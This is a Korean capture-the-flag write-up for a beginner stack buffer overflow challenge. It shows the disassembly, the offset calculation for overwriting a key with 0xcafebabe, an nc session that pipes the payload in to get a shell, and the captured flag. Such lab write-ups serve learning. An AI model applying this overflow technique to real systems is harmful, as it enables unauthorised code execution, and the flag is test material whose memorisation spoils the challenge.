# 풀이 과정
- &key: `ebp + 0x8
- overflowme: `ebp - 0x2c`
- 8 - (-44) = 52 -> 52B 떨어져 있음. 둘이 연속적으로 위치하지 않는다.
- 52B를 모두 덮어쓴다. 호출자에 대한 정보들이 있지만, 함수가 리턴하기 전까지는 덮어써도 문제 없다. 쉘을 얻을 때까지는 문제 없다.
```asm
pwndbg> disassemble func
Dump of assembler code for function func:
   0x565561fd <+0>:	push   ebp
   0x565561fe <+1>:	mov    ebp,esp
   0x56556200 <+3>:	push   esi
   0x56556201 <+4>:	push   ebx
   0x56556202 <+5>:	sub    esp,0x30
   0x56556205 <+8>:	call   0x56556100 <__x86.get_pc_thunk.bx>
   0x5655620a <+13>:	add    ebx,0x2df6
   0x56556210 <+19>:	mov    eax,gs:0x14
   0x56556216 <+25>:	mov    DWORD PTR [ebp-0xc],eax
   0x56556219 <+28>:	xor    eax,eax
   0x5655621b <+30>:	sub    esp,0xc
   0x5655621e <+33>:	lea    eax,[ebx-0x1ff8]
   0x56556224 <+39>:	push   eax
   0x56556225 <+40>:	call   0x56556050 <printf@plt>
   0x5655622a <+45>:	add    esp,0x10
   0x5655622d <+48>:	sub    esp,0xc
   0x56556230 <+51>:	lea    eax,[ebp-0x2c]
   0x56556233 <+54>:	push   eax
   0x56556234 <+55>:	call   0x56556060 <gets@plt>
   0x56556239 <+60>:	add    esp,0x10
   0x5655623c <+63>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x56556243 <+70>:	jne    0x56556272 <func+117>
   0x56556245 <+72>:	call   0x56556080 <getegid@plt>
   0x5655624a <+77>:	mov    esi,eax
   0x5655624c <+79>:	call   0x56556080 <getegid@plt>
   0x56556251 <+84>:	sub    esp,0x8
   0x56556254 <+87>:	push   esi
   0x56556255 <+88>:	push   eax
   0x56556256 <+89>:	call   0x565560b0 <setregid@plt>
   0x5655625b <+94>:	add    esp,0x10
   0x5655625e <+97>:	sub    esp,0xc
   0x56556261 <+100>:	lea    eax,[ebx-0x1fe9]
   0x56556267 <+106>:	push   eax
   0x56556268 <+107>:	call   0x565560a0 <system@plt>
   0x5655626d <+112>:	add    esp,0x10
   0x56556270 <+115>:	jmp    0x56556284 <func+135>
   0x56556272 <+117>:	sub    esp,0xc
   0x56556275 <+120>:	lea    eax,[ebx-0x1fe1]
   0x5655627b <+126>:	push   eax
   0x5655627c <+127>:	call   0x56556090 <puts@plt>
   0x56556281 <+132>:	add    esp,0x10
   0x56556284 <+135>:	nop
   0x56556285 <+136>:	mov    eax,DWORD PTR [ebp-0xc]
   0x56556288 <+139>:	sub    eax,DWORD PTR gs:0x14
   0x5655628f <+146>:	je     0x56556296 <func+153>
   0x56556291 <+148>:	call   0x565562e0 <__stack_chk_fail_local>
   0x56556296 <+153>:	lea    esp,[ebp-0x8]
   0x56556299 <+156>:	pop    ebx
   0x5655629a <+157>:	pop    esi
   0x5655629b <+158>:	pop    ebp
   0x5655629c <+159>:	ret
End of assembler dump.
```

- `nc 0 9000`을 통해 bof_pwn 권한으로 실행 중인 bof 프로세스에 접근한다. 여기서 shell을 탈취하면 flag 파일을 읽을 수 있다.
- `exploit.py` 스크립트의 실행 결과 파일 `/tmp/input2.txt`. 이 파일을 읽으면 key의 값이 `0xcafebabe`로 덮어쓰인다.
- 그런데 리다이렉션을 해버리면 표준 입력이 닫혀버리는 문제가 있다. 이를 해결하기 위해 cat 2개의 출력을 nc에 리다이렉션했다.
```bash
bof@ubuntu:~$ (cat /tmp/input2.txt; cat) | nc 0 9000
ls
bof
bof.c
flag
log
super.pl
cat flag
Daddy_I_just_pwned_a_buff3r!
exit
*** stack smashing detected ***: terminated
```
